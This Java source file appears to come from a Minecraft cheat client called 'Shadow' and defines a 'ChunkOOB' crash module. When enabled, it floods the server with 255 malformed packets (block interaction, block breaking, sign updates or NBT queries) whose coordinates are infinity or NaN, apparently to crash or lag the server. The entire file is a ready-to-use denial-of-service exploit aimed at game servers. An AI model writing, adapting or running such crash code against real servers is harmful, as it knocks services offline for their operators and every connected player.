package net.shadow.feature.module;

import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.QueryBlockNbtC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.MultiValue;
import net.shadow.utils.ChatUtils;
import net.shadow.utils.Utils;

public class InstantCrashModule extends Module {
    final MultiValue mode = this.config.create("Mode", "Interact", "Interact", "Break", "Sign", "Query");

    public InstantCrashModule() {
        super("ChunkOOB", "cause chunk error", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
        ChatUtils.message("Sending Packets...");
        new Thread(() -> {
            switch (mode.getThis().toLowerCase()) {
                case "interact" -> {
                    for (int i = 0; i < 255; i++) {
                        Utils.sleep(25);
                        ChatUtils.hud("Sent Packet " + i + "/255");
                        Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos(Double.POSITIVE_INFINITY, 100, Double.POSITIVE_INFINITY), true)));
                    }
                    ChatUtils.message("Sent Packets");
                    this.setEnabled(false);
                }
                case "break" -> {
                    for (int i = 0; i < 255; i++) {
                        Utils.sleep(25);
                        ChatUtils.hud("Sent Packet " + i + "/255");
                        Shadow.c.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.START_DESTROY_BLOCK, new BlockPos(Double.POSITIVE_INFINITY, 100, Double.POSITIVE_INFINITY), Direction.UP));
                        Shadow.c.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.STOP_DESTROY_BLOCK, new BlockPos(Double.POSITIVE_INFINITY, 100, Double.POSITIVE_INFINITY), Direction.UP));
                    }
                    ChatUtils.message("Sent Packets");
                    this.setEnabled(false);
                }
                case "sign" -> {
                    for (int i = 0; i < 255; i++) {
                        Utils.sleep(25);
                        ChatUtils.hud("Sent Packet " + i + "/255");
                        Shadow.c.player.networkHandler.sendPacket(new UpdateSignC2SPacket(new BlockPos(Double.NaN, 100, Double.POSITIVE_INFINITY), "crashed", "crashed", "crashed", "crashed"));
                    }
                    ChatUtils.message("Sent Packets");
                    this.setEnabled(false);
                }
                case "query" -> {
                    for (int i = 0; i < 255; i++) {
                        Utils.sleep(25);
                        ChatUtils.hud("Sent Packet " + i + "/255");
                        Shadow.c.player.networkHandler.sendPacket(new QueryBlockNbtC2SPacket(0, new BlockPos(Double.POSITIVE_INFINITY, 100, Double.POSITIVE_INFINITY)));
                    }
                    ChatUtils.message("Sent Packets");
                    this.setEnabled(false);
                }
            }
        }).start();
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {

    }

    @Override
    public void onRender() {

    }
}
